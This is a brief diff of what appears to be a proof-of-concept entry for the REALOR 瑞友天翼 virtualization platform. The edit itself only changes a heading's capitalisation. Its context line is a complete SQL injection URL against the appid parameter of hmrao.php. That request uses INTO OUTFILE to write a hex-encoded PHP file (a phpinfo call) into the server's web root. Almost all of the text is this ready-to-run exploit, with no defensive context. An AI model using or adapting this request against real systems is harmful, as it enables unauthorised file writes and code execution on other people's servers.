@@ -5,7 +5,7 @@
 app.name="REALOR 瑞友天翼虚拟化平台"
 ```
 
-## poc
+## POC
 ```
 http://xx.xx.xx.xx/hmrao.php?s=/Admin/appsave&appid=1%27);select%200x3c3f70687020706870696e666f28293b3f3e%20into%20outfile%20%27C:\Program%20Files%20(x86)\RealFriend\Rap%20Server\WebRoot\123.php%27%20--+
 
